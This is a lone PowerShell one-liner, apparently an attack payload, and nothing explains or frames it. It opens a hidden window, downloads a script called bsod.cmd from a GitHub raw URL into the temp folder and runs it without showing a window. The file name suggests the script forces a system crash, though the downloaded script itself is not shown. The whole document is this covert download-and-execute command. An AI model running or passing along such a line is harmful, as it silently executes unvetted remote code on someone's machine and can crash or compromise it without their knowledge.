powershell.exe -windowstyle hidden iwr https://raw.githubusercontent.com/alext30Developer/rdrp/main/BSOD/files/bsod.cmd -outfile $env:temp\bsod.cmd; start $env:temp\bsod.cmd -windowstyle hidden
